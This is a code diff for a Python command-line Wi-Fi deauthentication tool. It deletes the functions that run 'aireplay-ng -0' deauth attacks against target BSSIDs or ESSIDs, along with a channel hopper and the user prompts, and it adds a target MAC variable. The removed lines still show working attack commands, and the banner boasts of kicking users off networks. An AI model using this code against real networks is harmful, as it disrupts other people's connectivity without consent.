@@ -22,6 +22,7 @@ light_blue  = Terminal.Light_blue
 underline   = Terminal.Underline
 
 current_wiface = f""
+target_mac     = f""
 
 # Beautiful is better than ugly.
 # Explicit is better than implicit.
@@ -71,63 +72,13 @@ class Appearance:
 Time to kick off some assholes from yer net""")
         return True
 
-class BSSID_METHOD:
-    def deauth(bSSID: BSSID):
-        """"""
-        channel = Config.BSSIDs[bSSID]
-        ChannelSys.hopper(channel)
-        try:
-            out = check_call(["aireplay-ng", "-0", "5", "-a", bSSID, "-c", Config.STATION, Config.iface_mon], stdout=DEVNULL, stderr=STDOUT)
-        except KeyboardInterrupt:
-            Functs.switch(Interface(current_wiface), "managed")
-            return
-class ESSID_METHOD:
-    def deauth(eSSID: str):
-        """"""
-        channel = Config.ESSID[eSSID]
-        ChannelSys.hopper(channel)
-        try:
-            out = check_call(["aireplay-ng", "-0", "5", "-e", eSSID, "-c", Config.STATION, Config.iface_mon], stdout=DEVNULL, stderr=STDOUT)
-        except KeyboardInterrupt:
-            Functs.switch(Interface(current_wiface), "managed")
-            return
-
-class ChannelSys:
-    def hopper(channel_number: int):
-        """Hop to a different channel"""
-        out = check_call(["airmon-ng", "start", f"{current_wiface}mon", f"{channel_number}"], stdout=DEVNULL, stderr=STDOUT)
-
 def main():
-    def do_bssid_method():
-        for bssid, channel in Config.BSSIDs.items():
-            BSSID_METHOD.deauth(bssid)
-        try:
-            do_bssid_method()
-        except KeyboardInterrupt:
-            Functs.switch(card=Interface(current_wiface), mode="managed")
-            return
-    
     Terminal.inform(msg=f"{bold}{light_green}Hey! {end}{light_white}Tip of the day: Parrot Security or Kali Linux is recommended! Although, real control freaks use ArchLinux")
     Terminal.inform(msg=f"""{white}Type {light_white}"{white}!help{light_white}"{white} for a list of commands!""")
     if Checks.has_root():
         Terminal.inform(msg=f"{white}Running as {light_green}{bold}Root{end}")
-    Terminal.prompt(question=f"{white}{bold}[{Terminal.deauthy_non_tag.lower()}"+f"{white}{bold}]{light_green}SH", allowed_replies=["any"], ending_color=yellow)
+    Terminal.prompt(question=f" ", allowed_replies=["any"], ending_color=yellow)
 
-    method = Terminal.prompt(question="Use ESSID or BSSIDs (BSSID / ESSID)", allowed_replies=["bssid", "essid"])
-    if method == "BSSID":
-        try:
-            amt_of_bssids   = Terminal.prompt(question=f"How many BSSIDs?", allowed_replies=["any"])
-            numb_of_bssids  = int(amt_of_bssids)
-            bssids_added = 0
-            while bssids_added < numb_of_bssids:
-                Terminal.prompt(question=f"{white}Enter BSSID {light_green}{bold}{bssids_added+1}{end}{white}/{amt_of_bssids}", allowed_replies=["any"])
-            do_bssid_method()
-        except KeyboardInterrupt:
-            Functs.switch(Interface(current_wiface), "managed")
-            return
-    elif method == "ESSID":
-        ESSID_METHOD.deauth(Config.ESSID)
-        return
 
 try:
     if not Checks.has_root():
